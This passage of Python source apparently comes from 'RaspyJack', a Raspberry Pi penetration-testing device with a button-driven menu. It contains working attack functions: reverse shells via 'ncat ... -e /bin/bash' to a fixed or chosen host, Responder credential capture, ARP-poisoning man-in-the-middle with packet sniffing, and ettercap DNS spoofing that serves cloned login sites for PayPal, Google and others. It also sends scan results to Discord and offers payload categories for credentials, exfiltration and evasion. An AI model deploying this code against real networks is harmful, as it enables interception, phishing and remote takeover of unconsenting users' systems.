    # If not /24, offer quick mask choices
    try:
        detected_net = ipaddress.ip_network(ip_with_mask, strict=False)
        if detected_net.prefixlen != 24:
            interface_ip = get_interface_ip(interface)
            choices = [
                f" Use detected {detected_net.with_prefixlen}",
                " Force /24",
                " Force /16",
                " Force /8",
            ]
            idx, _ = GetMenuString(choices, duplicates=True)
            if idx == -1:
                return
            if idx == 0:
                ip_with_mask = detected_net.with_prefixlen
            else:
                if interface_ip:
                    forced_mask = {1: 24, 2: 16, 3: 8}[idx]
                    forced_net = ipaddress.ip_network(f"{interface_ip}/{forced_mask}", strict=False)
                    ip_with_mask = forced_net.with_prefixlen
    except Exception:
        pass

    ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    path = f"/root/Raspyjack/loot/Nmap/{label.lower().replace(' ', '_')}_{ts}.txt"
    xml_path = path.replace(".txt", ".xml")

    # Build nmap command with interface specification
    cmd = ["nmap"] + nmap_args + ["-oN", path, "-oX", xml_path]

    # Add interface-specific parameters for better results
    Dialog_info(f"      {label}\n        Running\n      wait please...", wait=True)

    interface_ip = get_interface_ip(interface)
    if interface_ip:
        cmd.extend(["-S", interface_ip, "-e", interface, "-Pn"])

    cmd.append(ip_with_mask)

    subprocess.run(cmd)
    subprocess.run(["sed", "-i", "s/Nmap scan report for //g", path])

    # Send scan results to Discord (non-blocking)
    def send_results_to_discord():
        try:
            if os.path.exists(path):
                # Send the file directly instead of reading content
                send_to_discord(label, path, ip_with_mask, interface)
        except Exception as e:
            print(f"Error sending scan results to Discord: {e}")

    # Send to Discord in background thread
    threading.Thread(target=send_results_to_discord, daemon=True).start()

    Dialog_info(f"      {label}\n      Finished !!!\n   Interface: {interface}", wait=True)
    time.sleep(2)


# ---------- main table Nmap arguments -----------------
SCANS = {
    "Quick Scan"            : ["-T5"],
    "Full Port Scan"        : ["-p-"],
    "Service Scan"          : ["-T5", "-sV"],
    "Vulnerability"         : ["-T5", "-sV", "--script", "vuln"],
    "Full Vulns"            : ["-p-", "-sV", "--script", "vuln"],
    "OS Scan"               : ["-T5", "-A"],
    "Intensive Scan"        : ["-O", "-p-", "--script", "vuln"],
    "Stealth SYN Scan"      : ["-sS", "-T4"],                        # Half-open scan, avoids full TCP handshake
    "UDP Scan"              : ["-sU", "-T4"],                        # Finds services that only speak UDP
    "Ping Sweep"            : ["-sn"],                               # Host discovery without port scanning
    "Top100 Scan"           : ["--top-ports", "100", "-T4"],         # Quick look at the most common ports
    "HTTP Enumeration"      : ["-p", "80,81,443,8080,8443", "-sV", "--script", "http-enum,http-title"],  # Fast web-focused recon
}


globals().update({
    f"scan_{k.lower().replace(' ', '_')}": partial(run_scan, k, v)
    for k, v in SCANS.items()
})



def defaut_Reverse():
    # Get best available interface and its IP
    interface = _choose_interface_for_action(get_best_interface_prefer_eth())
    if interface == "__back__":
        return

    try:
        default_ip_bytes = subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'|cut -d'.' -f1-3", shell=True)
        default_ip = default_ip_bytes.decode('utf-8').strip()
        default_ip_parts = default_ip.split(".")
        default_ip_prefix = ".".join(default_ip_parts[:3])
        new_value = GetIpValue(default_ip_prefix)
        target_ip = f"{default_ip_prefix}.{new_value}"
        nc_command = ['ncat', target_ip, '4444', '-e', '/bin/bash']
        print(f"Reverse launched on {target_ip} via {interface}!!!!!")
        process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
        Dialog_info(f"   Reverse launched !\n   on {target_ip}\n   via {interface}", wait=True)
        time.sleep(2)
    except Exception as e:
        Dialog_info(f"Reverse Error\nInterface: {interface}\nNo network?", wait=True)
        time.sleep(2)

def remote_Reverse():
    nc_command = ['ncat','192.168.1.30','4444', '-e', '/bin/bash']
    process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
    reverse_status = "(!!Remote launched!!)"
    draw.text((30, 0), reverse_status, fill="WHITE", font=font)

def responder_on():
    check_responder_command = "ps aux | grep Responder | grep -v grep | cut -d ' ' -f7"
    check_responder_process = os.popen(check_responder_command).read().strip()
    if check_responder_process:
        subprocess.check_call(check_responder_command, shell=True)
        Dialog_info(" Already running !!!!", wait=True)
        time.sleep(2)
    else:
        # Get best interface for Responder
        interface = _choose_interface_for_action(get_responder_interface())
        if interface == "__back__":
            return
        os.system(f'python3 /root/Raspyjack/Responder/Responder.py -Q -I {interface} &')
        Dialog_info(f"     Responder \n      started !!\n   Interface: {interface}", wait=True)
        time.sleep(2)

def responder_off():
    os.system("killResponder=$(ps aux | grep Responder|grep -v 'grep'|awk '{print $2}')&&kill -9 $killResponder")
    Dialog_info("   Responder \n     stopped !!", wait=True)
    time.sleep(2)


def _get_gateway_for_interface(interface):
    try:
        gateways = netifaces.gateways()
        default_gw = gateways.get("default", {}).get(netifaces.AF_INET)
        if default_gw and default_gw[1] == interface:
            return default_gw[0]
        for gw, iface, _ in gateways.get(netifaces.AF_INET, []):
            if iface == interface:
                return gw
    except Exception:
        pass
    return None

def get_default_gateway_ip(interface=None):
    if interface:
        gw = _get_gateway_for_interface(interface)
        if gw:
            return gw
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]

def get_local_network(interface=None):
    if interface:
        ip, mask = _get_interface_ipv4(interface)
        if ip and mask:
            try:
                net = ipaddress.ip_network(f"{ip}/{mask}", strict=False)
                return net.with_prefixlen
            except Exception:
                pass
    default_gateway_ip = get_default_gateway_ip(interface)
    if default_gateway_ip:
        ip_parts = default_gateway_ip.split('.')
        ip_parts[-1] = '0'
        return '.'.join(ip_parts) + '/24'
    if interface:
        ip, _ = _get_interface_ipv4(interface)
        if ip:
            ip_parts = ip.split('.')
            ip_parts[-1] = '0'
            return '.'.join(ip_parts) + '/24'
    return None

def Start_MITM():
    safe_kill("arpspoof", "tcpdump")
    Dialog_info("                    Lancement\n                  MITM & Sniff\n                   En cours\n                  Patientez...", wait=True)

    # Get best interface for MITM attack
    interface = _choose_interface_for_action(get_mitm_interface())
    if interface == "__back__":
        return
    Dialog_info(f"Interface: {interface}", wait=False)
    local_network = get_local_network(interface)
    if not local_network:
        Dialog_info("MITM Error\nNo network\nfor interface", wait=True)
        return
    # Offer /24 or /16 if prefix is larger than /24
    try:
        net = ipaddress.ip_network(local_network, strict=False)
        if net.prefixlen < 24:
            ip, _mask = _get_interface_ipv4(interface)
            base24 = None
            base16 = None
            if ip:
                try:
                    base24 = str(ipaddress.ip_network(f"{ip}/24", strict=False).network_address)
                    base16 = str(ipaddress.ip_network(f"{ip}/16", strict=False).network_address)
                except Exception:
                    pass
            base24 = base24 or str(net.network_address)
            base16 = base16 or str(net.network_address)
            options = [("/24", base24), ("/16", base16)]
            idx = 0
            while True:
                lines = ["Select mask"]
                for i, (opt, base) in enumerate(options):
                    mark = ">" if i == idx else " "
                    lines.append(f"{mark}{base}{opt}")
                lines.append("KEY3=Back")
                draw_lock.acquire()
                try:
                    _draw_toolbar()
                    color.DrawMenuBackground()
                    for i, line in enumerate(lines[:7]):
                        draw.text(
                            (default.start_text[0],
                             default.start_text[1] + default.text_gap * i),
                            line[:m.max_len],
                            font=text_font,
                            fill=color.text
                        )
                finally:
                    draw_lock.release()
                time.sleep(0.12)
                btn = getButton()
                if btn == "KEY_UP_PIN":
                    idx = max(0, idx - 1)
                elif btn == "KEY_DOWN_PIN":
                    idx = min(len(options) - 1, idx + 1)
                elif btn == "KEY3_PIN" or btn == "KEY_LEFT_PIN":
                    return
                elif btn == "KEY_PRESS_PIN":
                    chosen_opt, chosen_base = options[idx]
                    local_network = f"{chosen_base}{chosen_opt}"
                    break
    except Exception:
        pass
    Dialog_info(f"Network: {local_network}", wait=False)
    print(f"[*] Starting MITM attack on local network {local_network} via {interface}...")

# Scan hosts on the network
    print("[*] Scanning hosts on network...")
    cmd = f"arp-scan --localnet --interface {interface} --quiet|grep -v 'Interface\\|Starting\\|packets\\|Ending'"
    result = os.popen(cmd).readlines()

# Display IP and MAC addresses of hosts
    hosts = []
    for line in result:
        parts = line.split()
        if len(parts) == 2:
            hosts.append({'ip': parts[0], 'mac': parts[1]})
            print(f"[+] Host: {parts[0]} ({parts[1]})")

# Retrieve the gateway IP address
    gateway_ip = get_default_gateway_ip(interface)
    print(f"[*] Default gateway IP: {gateway_ip}")

# If at least one host is found, launch the ARP MITM attack
    if len(hosts) > 1:
        print(f"[*] Launching ARP poisoning attack via {interface}...")
        for host in hosts:
            if host['ip'] != gateway_ip:
                subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, host['ip']])
                subprocess.Popen(["arpspoof", "-i", interface, "-t", host['ip'], gateway_ip])
        print("[*] ARP poisoning attack complete.")

# Start tcpdump capture to sniff network traffic
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        pcap_file = f"/root/Raspyjack/loot/MITM/network_traffic_{now}.pcap"
        print(f"[*] Starting tcpdump capture and writing packets to {pcap_file}...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        tcpdump_process = subprocess.Popen(["tcpdump", "-i", interface, "-w", pcap_file], stdout=subprocess.PIPE)
        tcpdump_process.stdout.close()
        Dialog_info(f" MITM & Sniff\n Sur {len(hosts)-1} hosts !!!\n Interface: {interface}", wait=True)
        time.sleep(8)
    else:
        print("[-] No hosts found on network.")
        Dialog_info("  ERREUR\nAucun hote.. ", wait=True)
        time.sleep(2)

def Stop_MITM():
    safe_kill("arpspoof", "tcpdump")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    time.sleep(2)
    responder_status = "(!! MITM stopped !!)"
    draw.text((30, 0), responder_status, fill="WHITE", font=font)
    Dialog_info("    MITM & Sniff\n     stopped !!!", wait=True)
    time.sleep(2)


# Name of the currently spoofed site (used elsewhere in your code)
site_spoof = "wordpress"

def spoof_site(name: str):
    global site_spoof
    site_spoof = name

    Dialog_info(f"    Spoofing sur\n    {name} !!!", wait=True)
    time.sleep(2)

    subprocess.run("pkill -f 'php'", shell=True)   # stoppe les instances PHP
    time.sleep(1)

    webroot = f"/root/Raspyjack/DNSSpoof/sites/{name}"
    cmd = f"cd {webroot} && php -S 0.0.0.0:80"
    subprocess.Popen(cmd, shell=True)              # launch the built-in PHP

# Central list of sites to spoof: add/remove freely here
SITES = [
    "microsoft", "wordpress", "instagram", "google", "amazon", "apple",
    "twitter", "netflix", "spotify", "paypal", "linkedin", "snapchat",
    "pinterest", "yahoo", "steam", "adobe", "badoo", "icloud",
    "instafollowers", "ldlc", "origin", "playstation", "protonmail",
    "shopping", "wifi", "yandex",
]

site_spoof = "wordpress"
# Chemin du fichier etter.dns
ettercap_dns_file = "/etc/ettercap/etter.dns"


def Start_DNSSpoofing():
    # Get best interface for DNS spoofing
    interface = _choose_interface_for_action(get_best_interface_prefer_eth())
    if interface == "__back__":
        return

    # Get gateway and current IP automatically
    gateway_ip = get_default_gateway_ip(interface)
    current_ip = get_dns_spoof_ip(interface)

    if not current_ip:
        Dialog_info("DNS Spoof Error\nNo IP available", wait=True)
        return

# Escape special characters in the IP address for the sed command
    escaped_ip = current_ip.replace(".", r"\.")

    # Use sed to modify IP addresses in etter.dns file
    sed_command = f"sed -i 's/[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+/{escaped_ip}/g' {ettercap_dns_file}"
    subprocess.run(sed_command, shell=True)

    print("------------------------------- ")
    print(f"Site : {site_spoof}")
    print(f"Interface: {interface}")
    print(f"IP: {current_ip}")
    print("------------------------------- ")
    print("dns domain spoofed : ")
    dnsspoof_command = f"cat {ettercap_dns_file} | grep -v '#'"
    subprocess.run(dnsspoof_command, shell=True)
    print("------------------------------- ")

# Commands executed in the background
    website_command = f"cd /root/Raspyjack/DNSSpoof/sites/{site_spoof} && php -S 0.0.0.0:80"
    ettercap_command = f"ettercap -Tq -M arp:remote -P dns_spoof -i {interface}"
    Dialog_info(f"    DNS Spoofing\n   {site_spoof}  started !!!\n Interface: {interface}", wait=True)
    time.sleep(2)

# Execution of background commands
    website_process = subprocess.Popen(website_command, shell=True)
    ettercap_process = subprocess.Popen(ettercap_command, shell=True)


def Stop_DNSSpoofing():
    # Terminer les processus website et ettercap
    subprocess.run("pkill -f 'php'", shell=True)
    subprocess.run("pkill -f 'ettercap'", shell=True)

    Dialog_info("    DNS Spoofing\n     stopped !!!", wait=True)
    time.sleep(2)

# WiFi Management Functions
def launch_wifi_manager():
    """Launch the FAST WiFi interface."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)
        return

    Dialog_info("Loading FAST WiFi\nSwitcher...", wait=True)
    exec_payload("utilities/fast_wifi_switcher.py")

def show_interface_info():
    """Show detailed interface information."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import show_interface_info as show_info

        # Create a text display of interface info
        current_interface = get_best_interface_prefer_eth()
        interface_ip = get_interface_ip(current_interface)

        info_lines = [
            f"Current: {current_interface}",
            f"IP: {interface_ip or 'None'}",
            "",
            "Press any key to exit"
        ]

        if current_interface.startswith('wlan'):
            try:
                from wifi.wifi_manager import wifi_manager
                status = wifi_manager.get_connection_status(current_interface)
                if status["ssid"]:
                    info_lines.insert(2, f"SSID: {status['ssid']}")
            except:
                pass

        GetMenuString(info_lines)

    except Exception as e:
        Dialog_info(f"Interface Info Error\n{str(e)[:20]}", wait=True)

def switch_interface_menu():
    """Show interface switching menu with actual switching capability."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import (
            list_wifi_interfaces_with_status,
            get_current_raspyjack_interface,
            set_raspyjack_interface
        )

        # Get current interface
        current = get_current_raspyjack_interface()

        # Get WiFi interfaces with status
        wifi_interfaces = list_wifi_interfaces_with_status()

        if not wifi_interfaces:
            Dialog_info("No WiFi interfaces\nfound!", wait=True)
            return

        # Create menu with interface status
        interface_list = []
        for iface_info in wifi_interfaces:
            name = iface_info['name']
            current_mark = ">" if iface_info['current'] else " "
            conn_status = "UP" if iface_info['connected'] else "DOWN"
            ip = iface_info['ip'][:10] if iface_info['ip'] else "No IP"
            interface_list.append(f"{current_mark} {name} ({conn_status}) {ip}")

        interface_list.append("")
        interface_list.append("Select WiFi interface")

        selection = GetMenuString(interface_list)

        if selection and not selection.startswith("Select") and selection.strip() and not selection.startswith(" "):
            # Extract interface name from selection
            parts = selection.split()
            if len(parts) >= 2:
                selected_iface = parts[1]  # Get the wlan0/wlan1 part

                if selected_iface.startswith('wlan'):
                    Dialog_info(f"Switching to\n{selected_iface}\nConfiguring routes...", wait=True)

                    # Actually perform the switch
                    success = set_raspyjack_interface(selected_iface)

                    if success:
                        Dialog_info(f"✓ SUCCESS!\nRaspyJack now using\n{selected_iface}\nAll tools updated", wait=True)
                    else:
                        Dialog_info(f"✗ FAILED!\nCould not switch to\n{selected_iface}\nCheck connection", wait=True)

    except Exception as e:
        Dialog_info(f"Switch Error\n{str(e)[:20]}", wait=True)

def show_routing_status():
    """Show current routing status."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import get_current_default_route

        current_route = get_current_default_route()
        current_interface = get_best_interface_prefer_eth()

        if current_route:
            info_lines = [
                "Routing Status:",
                f"Default: {current_route.get('interface', 'unknown')}",
                f"Gateway: {current_route.get('gateway', 'unknown')}",
                f"RaspyJack uses: {current_interface}",
                "",
                "Press any key to exit"
            ]
        else:
            info_lines = [
                "Routing Status:",
                "No default route found",
                f"RaspyJack uses: {current_interface}",
                "",
                "Press any key to exit"
            ]

        GetMenuString(info_lines)

    except Exception as e:
        Dialog_info(f"Routing Error\n{str(e)[:20]}", wait=True)

def switch_to_wifi():
    """Switch system to use WiFi as primary interface."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import get_available_interfaces, ensure_interface_default

        # Find WiFi interfaces
        interfaces = get_available_interfaces()
        wifi_interfaces = [iface for iface in interfaces if iface.startswith('wlan')]

        if not wifi_interfaces:
            Dialog_info("No WiFi interfaces\nfound", wait=True)
            return

        # Use first available WiFi interface
        wifi_iface = wifi_interfaces[0]
        Dialog_info(f"Switching to WiFi\n{wifi_iface}\nPlease wait...", wait=True)

        success = ensure_interface_default(wifi_iface)

        if success:
            Dialog_info(f"✓ Switched to WiFi\n{wifi_iface}\nAll tools use WiFi", wait=True)
        else:
            Dialog_info(f"✗ Switch failed\nCheck WiFi connection", wait=True)

    except Exception as e:
        Dialog_info(f"WiFi Switch Error\n{str(e)[:20]}", wait=True)

def switch_to_ethernet():
    """Switch system to use Ethernet as primary interface."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import ensure_interface_default

        Dialog_info("Switching to Ethernet\neth0\nPlease wait...", wait=True)

        success = ensure_interface_default("eth0")

        if success:
            Dialog_info("✓ Switched to Ethernet\neth0\nAll tools use ethernet", wait=True)
        else:
            Dialog_info("✗ Switch failed\nCheck ethernet connection", wait=True)

    except Exception as e:
        Dialog_info(f"Ethernet Switch Error\n{str(e)[:20]}", wait=True)

def launch_interface_switcher():
    """Launch the interface switcher payload."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    Dialog_info("Loading Interface\nSwitcher...", wait=True)
    exec_payload("interface_switcher_payload.py")

def launch_webui():
    """Launch the WebUI controller payload (start/stop Web UI)."""
    Dialog_info("Loading WebUI...", wait=True)
    exec_payload("utilities/webui.py")

def quick_wifi_toggle():
    """FAST toggle between wlan0 and wlan1 - immediate switching."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import (
            get_current_raspyjack_interface,
            set_raspyjack_interface
        )

        current = get_current_raspyjack_interface()

        # Determine target interface immediately
        if current == 'wlan0':
            target = 'wlan1'
        elif current == 'wlan1':
            target = 'wlan0'
        else:
            # Default to wlan1 if not using either
            target = 'wlan1'

        Dialog_info(f"FAST SWITCH:\n{current} -> {target}\nSwitching now...", wait=True)

        # IMMEDIATE switch with force
        success = set_raspyjack_interface(target)

        if success:
            Dialog_info(f"✓ SWITCHED!\n{target} active\n\nAll tools now\nuse {target}", wait=True)
        else:
            Dialog_info(f"✗ FAILED!\n{target} not ready\nCheck connection", wait=True)

    except Exception as e:
        Dialog_info(f"Error: {str(e)[:20]}", wait=True)


def list_payloads():
    """
    Returns the list of .py scripts under payload_path, as relative paths.
    """
    payloads = []
    try:
        for root, dirs, files in os.walk(default.payload_path):
            # Skip cache/hidden folders
            dirs[:] = [d for d in dirs if not d.startswith(".") and d != "__pycache__"]
            rel_dir = os.path.relpath(root, default.payload_path)
            for f in files:
                if not f.endswith(".py") or f.startswith("_"):
                    continue
                rel_path = os.path.join(rel_dir, f) if rel_dir != "." else f
                payloads.append(rel_path)
    except FileNotFoundError:
        os.makedirs(default.payload_path, exist_ok=True)
        return []

    return sorted(payloads, key=str.lower)

def list_payloads_by_category():
    """
    Return payloads grouped by category folder.
    - Files in payload_path root go to "general".
    - Subdirectory files show with subdir prefix.
    """
    categories: dict[str, list[str]] = {}
    for rel_path in list_payloads():
        parts = rel_path.split(os.sep)
        if len(parts) == 3:
            category = parts[0]
            display_name = f"{parts[1]}/{parts[2].replace('.py', '')}"
            rel_path = f"{category}/{display_name}"
        elif len(parts) > 1:
            category = parts[0]
        else:
            category = "general"
        categories.setdefault(category, []).append(rel_path)
    return categories

# ---------------------------------------------------------------------------
# Payload state (for WebUI status)
# ---------------------------------------------------------------------------
PAYLOAD_STATE_PATH = "/dev/shm/rj_payload_state.json"

def _write_payload_state(running: bool, path: str | None = None) -> None:
    try:
        state = {
            "running": bool(running),
            "path": path if running else None,
            "ts": time.time(),
        }
        with open(PAYLOAD_STATE_PATH, "w", encoding="utf-8") as f:
            json.dump(state, f)
    except Exception:
        pass

# ---------------------------------------------------------------------------
# 1)  Helper – reset GPIO *and* re-initialise the LCD
# ---------------------------------------------------------------------------
def _setup_gpio() -> None:
    """
    Bring every pin back to a known state **after** a payload
    (which most likely called ``GPIO.cleanup()`` on exit) and create a *fresh*
    LCD driver instance so that the display can be used again.
    """
    # --- GPIO -------------------------------------------------------------
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():                     # all buttons back to inputs
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    # --- LCD --------------------------------------------------------------
    global LCD, image, draw                      # replace the old objects
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (LCD.width, LCD.height), "BLACK")
    draw  = ImageDraw.Draw(image)


# ---------------------------------------------------------------------------
# 2)  exec_payload – run a script then *immediately* restore RaspyJack UI
# ---------------------------------------------------------------------------
def exec_payload(filename: str, *args) -> None:
    """
    Execute a Python script located in « payloads/ » and *always*
    return control – screen **and** buttons – to RaspyJack.

    Workflow
    --------
    1. Freeze the UI (stop background threads, black screen).
    2. Run the payload **blocking** in the foreground.
    3. Whatever happens, re-initialise GPIO + LCD and redraw the menu.
    """
    # Support passing (filename, arg1, arg2) as tuple for dynamic menus
    if isinstance(filename, (list, tuple)):
        if len(filename) >= 2:
            args = filename[1:] + args
            filename = filename[0]
        else:
            filename = filename[0]

    full = os.path.join(default.payload_path, filename)
    # Ensure .py extension
    if not full.endswith(".py"):
        full += ".py"
    if not os.path.isfile(full):
        print(f"[PAYLOAD] ✗ File not found: {full}")
        return                                       # nothing to launch

    print(f"[PAYLOAD] ► Starting: {filename}")
    _write_payload_state(True, filename)
    screen_lock.set()                # stop _stats_loop & _display_loop
    LCD.LCD_Clear()                  # give the payload a clean canvas

    log = open(default.payload_log, "ab", buffering=0)
    try:
        # Ensure payloads can import RaspyJack modules reliably
        env = os.environ.copy()
        env["PYTHONPATH"] = default.install_path + os.pathsep + env.get("PYTHONPATH", "")
        cmd = ["python3", full]
        if args:
            cmd.extend(args)
        result = subprocess.run(
            cmd,
            cwd=default.install_path,  # same PYTHONPATH as RaspyJack
            env=env,
            stdout=log,
            stderr=subprocess.STDOUT,
        )
        if log and log.tell() is not None:
            log.flush()
        if result.returncode == 0:
            print("[PAYLOAD]   • Finished without error.")
        else:
            print(f"[PAYLOAD]   • ERROR: exit code {result.returncode}")
            Dialog_info("Payload error\nCheck payload.log", wait=True)
    except Exception as exc:
        print(f"[PAYLOAD]   • ERROR: {exc!r}")
        Dialog_info("Payload error\nCheck payload.log", wait=True)

    # ---- restore RaspyJack ----------------------------------------------
    print("[PAYLOAD] ◄ Restoring LCD & GPIO…")
    _write_payload_state(False, None)
    _setup_gpio()                                  # SPI/DC/RST/CS back
    try:
        rj_input.restart_listener()                # ensure virtual input socket is back
    except AttributeError:
        pass

    # Force a clean full-screen redraw to avoid leftover artifacts/border loss
    try:
        LCD.LCD_Clear()
    except Exception:
        pass
    try:
        draw_lock.acquire()
        draw.rectangle((0, 0, LCD.width, LCD.height), fill=color.background)
        color.DrawBorder()
    finally:
        draw_lock.release()

    # refresh favorites in main menu (user may have changed them)
    m._inject_favorites()

    # rebuild the current menu image (respect current view mode)
    RenderCurrentMenuOnce()
    _mark_user_activity()

    # small debounce: 300 ms max
    t0 = time.time()
    while any(GPIO.input(p) == 0 for p in PINS.values()) and time.time() - t0 < .3:
        time.sleep(.03)

    screen_lock.clear()                            # threads can run again
    print("[PAYLOAD] ✔ Menu ready – you can navigate again.")


### Menu class ###
class DisposableMenu:
    which  = "a"     # Start menu
    select = 0       # Current selection index
    _select_stack = []  # stack to remember parent selection when entering submenus
    char   = "> "    # Indentation character
    max_len = 17     # Max chars per line
    view_mode = "list"  # "list", "grid", or "carousel" - current view mode

    menu = {
        "a": (
            [" Scan Nmap",      "ab"],     # b
            [" Reverse Shell",  "ac"],     # c
            [" Responder",      "ad"],     # d
            [" MITM & Sniff",   "ai"],     # i
            [" DNS Spoofing",   "aj"],     # j
            [" Network info",   ShowInfo], # appel direct
            [" WiFi Manager",   "aw"],     # w
            [" Other features", "ag"],     # g
            [" Read file",      "ah"],     # h
            [" Payload", "ap"],            # p
            [" Lock",           OpenLockMenu],
        ),

        "ab": tuple(
            [f" {name}", partial(run_scan, name, args)]
            for name, args in SCANS.items()
        ),

        "ac": (
            [" Defaut Reverse",  defaut_Reverse],
            [" Remote Reverse",  remote_Reverse]
        ),

        "ad": (
            [" Responder ON",   responder_on],
            [" Responder OFF",  responder_off]
        ),
        "ag": (
            [" Browse Images", ImageExplorer],
            [" Discord status", ShowDiscordInfo],
            [" Options",       "ae"],   # e
            [" System",        "af"]    # f
        ),

        "ae": (
            [" Colors",         "aea"],
            [" Flip screen 180", ToggleFlip],
            [" Refresh config", LoadConfig],
            [" Save config!",   SaveConfig]
        ),

        "aea": (
            [" Background",          [SetColor, 0]],
            [" Text",                [SetColor, 2]],
            [" Selected text",       [SetColor, 3]],
            [" Selected background", [SetColor, 4]],
            [" Border",              [SetColor, 1]],
            [" Gamepad border",      [SetColor, 5]],
            [" Gamepad fill",        [SetColor, 6]]
        ),

        "af": (
            [" Shutdown system", [Leave, True]],
            [" Restart UI",      Restart]
        ),

        "ah": (
            [" Nmap",      ReadTextFileNmap],
            [" Responder logs", ReadTextFileResponder],
            [" Wardriving", ReadTextFileWardriving],
            [" DNSSpoof",  ReadTextFileDNSSpoof]
        ),

        "ai": (
            [" Start MITM & Sniff", Start_MITM],
            [" Stop MITM & Sniff",  Stop_MITM]
        ),

        "aj": (
            [" Start DNSSpoofing",  Start_DNSSpoofing],
            [" Select site",        "ak"],
            [" Stop DNS&PHP",       Stop_DNSSpoofing]
        ),

        "ak": tuple(
            [f" {site}", partial(spoof_site, site)]
            for site in SITES
        ),

        "aw": (
            [" Full WiFi Manager", partial(exec_payload, "utilities/wifi_manager_payload")],
            [" FAST WiFi Switcher", launch_wifi_manager],
            [" INSTANT Toggle 0↔1", quick_wifi_toggle],
            [" Switch Interface", switch_interface_menu],
            [" Show Interface Info", show_interface_info],
            [" WebUI", launch_webui],
            [" Route Control", "awr"],
        ) if WIFI_AVAILABLE else (
            [" WiFi Not Available", lambda: Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)],
        ),

        "awr": (
            [" Show Routing Status", show_routing_status],
            [" Switch to WiFi", switch_to_wifi],
            [" Switch to Ethernet", switch_to_ethernet],
            [" Interface Switcher", launch_interface_switcher]
        ),
    }

    # -----------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------
    def GetMenuList(self):
        """Return only the labels of the current menu."""
        return [item[0] for item in self.menu[self.which]]

    def GetMenuIndex(self, inlist):
        """Return the index of the selected label, or -1 if none."""
        x = GetMenuString(inlist)
        if x:
            for i, (label, _) in enumerate(self.menu[self.which]):
                if label == x:
                    return i
        return -1
    # Favoris injection into main menu ----------------------------------------
    _fav_labels = set()  # track injected favorite labels for cleanup

    def _inject_favorites(self):
        """Read favorites.json and inject payloads into main menu 'a' with their original icon."""
        fav_file = "/root/Raspyjack/loot/Favorites/favorites.json"
        try:
            with open(fav_file, "r") as f:
                favs = json.load(f).get("favorites", [])
        except Exception:
            favs = []

        # Remove old favorites from menu
        base_menu = [item for item in self.menu["a"] if item[0] not in self._fav_labels]
        self._fav_labels.clear()

        if not favs:
            self.menu["a"] = tuple(base_menu)
            return

        # Build favorite entries using same label format as payload menu: " name"
        # This way MENU_ICONS[" name"] matches and the correct icon is displayed
        fav_entries = []
        stale = []
        for fav_path in sorted(favs):
            # Validate that the payload file still exists on disk
            full = os.path.join(default.payload_path, fav_path)
            if not full.endswith(".py"):
                full += ".py"
            if not os.path.isfile(full):
                stale.append(fav_path)
                continue
            name = os.path.splitext(os.path.basename(fav_path))[0]
            label = f" {name}"  # same format as payload menu
            self._fav_labels.add(label)
            fav_entries.append([label, partial(exec_payload, fav_path)])

        # Auto-clean stale favorites (renamed/deleted payloads)
        if stale:
            cleaned = [f for f in favs if f not in stale]
            try:
                with open(fav_file, "w") as f:
                    json.dump({"favorites": sorted(cleaned)}, f, indent=2)
            except Exception:
                pass

        if fav_entries:
            menu_list = list(base_menu)
            insert_idx = len(menu_list) - 1  # before Lock
            for i, entry in enumerate(fav_entries):
                menu_list.insert(insert_idx + i, entry)
            self.menu["a"] = tuple(menu_list)

    # Génération à chaud du sous-menu Payload -------------------------------
    def _build_payload_menu(self):
        """Crée (ou rafraîchit) le menu 'ap' par catégories."""
        self.menu_parent = {}
        category_order = [
            "reconnaissance",
            "wifi",
            "network",
            "credentials",
            "bluetooth",
            "usb",
            "exfiltration",
            "evasion",
            "remote_access",
            "utilities",
            "hardware",
            "games",
            "examples",
        ]

        def _label(cat: str) -> str:
            return f" {cat.replace('_', ' ').title()}"

        categories = list_payloads_by_category()
        menu_items = []

        for cat in category_order:
            scripts = categories.get(cat, [])
            if not scripts:
                continue

            # Separate root-level files from subdirectory files
            root_files = []
            subdirs = {}
            for path in scripts:
                parts = path.split('/')
                if len(parts) > 2 and parts[0] == cat:
                    subdir = parts[1]
                    if subdir not in subdirs:
                        subdirs[subdir] = []
                    subdirs[subdir].append(path)
                else:
                    # Root-level file (in category root or general)
                    root_files.append(path)

            # Build category menu - root files listed directly, subdirs as folders
            cat_items = []

            # Add root files directly to category menu
            for p in root_files:
                cat_items.append([f" {os.path.splitext(os.path.basename(p))[0]}", partial(exec_payload, p)])

            # Add subdirectories as expandable folders
            for subdir in sorted(subdirs.keys()):
                subdir_paths = subdirs[subdir]
                subkey = f"ap_{cat}_{subdir}"
                self.menu[subkey] = tuple(
                    [f" {os.path.splitext(os.path.basename(p))[0]}", partial(exec_payload, p)]
